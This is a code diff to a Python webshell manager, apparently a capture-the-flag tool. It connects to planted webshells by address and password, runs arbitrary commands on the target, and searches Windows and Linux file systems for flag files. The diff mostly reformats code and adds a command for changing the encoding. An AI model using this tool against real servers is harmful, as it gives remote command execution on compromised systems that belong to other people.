@@ -92,6 +92,7 @@ class ShellManager(object):
         """
         flag_regexp = re.compile(r"(\w+\{[-\w]+\})")
         obj = self.shell_obj_list[int(index)]
+
         if obj.sys == "win":
             tmp = obj.post_cmd_shell("for /r {}:\ %i in (flag.*) do @echo %i".format(_dir))
             print("\n[+]Flag files:")
@@ -108,6 +109,7 @@ class ShellManager(object):
                             print("[+]Flag found in "+i+": "+j+"\n")
                 except:
                     continue
+
         elif obj.sys == "linux":
             tmp_1 = obj.post_cmd_shell("find {} -name flag".format(_dir))
             tmp_2 = obj.post_cmd_shell("find {} -name flag.*".format(_dir))
@@ -139,11 +141,17 @@ class ShellManager(object):
         print("[+]Set URL => "+a._url)
         print("[+]Set Language => "+a._lang)
         print("[+]Set Encode => "+a.sys_encode)
+        print("[+]enter `set encode xxx` to change encode")
         while True:
             print(a.current_dic+"> ", end="")
             arg = input()
             if arg.lower() == "exit":
                 return
+            elif "set encode" in arg.lower():
+                enc = arg.lower().strip().split(" ")[-1]
+                a.sys_encode = enc
+                print("[+]Change encode to "+enc+"\n")
+                continue
             print(a.post_cmd_shell(arg))
             
     def shell_loop(self, shell_id):
@@ -256,13 +264,16 @@ if __name__ == "__main__":
     """
     if "mysql" in t or "mssql" in t:
         parser.add_argument("dburi", type=str, help="db's uri", default="")
-    elif ("http" in t and t.count("-phttp")==0 and t.count("--proxyhttp")==0) or (t.count("http")==2):
+    elif ("http" in t and t.count("-phttp")==0 and t.count("--proxyhttp")==0) \
+         or (t.count("http")==2):
         parser.add_argument("shell", type=str, help="webshell's addr", default="")
         parser.add_argument("pwd", type=str, help="webshell's passwd", default="")
     
-    parser.add_argument("-l", "--lang", type=str, dest="lang", help="if webshell's language is diffrent"\
-                        " to file suffix name, use it", default="")
-    parser.add_argument("-p", "--proxy", type=str, dest="proxy", default="", help="requests' proxy, e.g: socks5://127.0.0.1:1080")
+    parser.add_argument("-l", "--lang", type=str, dest="lang", 
+            help="if webshell's language is diffrent"\
+            " to file suffix name, use it", default="")
+    parser.add_argument("-p", "--proxy", type=str, dest="proxy", default="",
+            help="requests' proxy, e.g: socks5://127.0.0.1:1080")
     args = parser.parse_args(sys.argv[1:])
     
     proxies = None
@@ -283,5 +294,6 @@ if __name__ == "__main__":
     else:
         if not args.lang:
             args.lang = args.shell.split(".")[-1]
-        ShellManager(isManagerMode).only_one_shell_loop(args.shell, args.pwd, args.lang, proxies)
+        ShellManager(isManagerMode).only_one_shell_loop(args.shell, args.pwd, 
+                                                        args.lang, proxies)
         
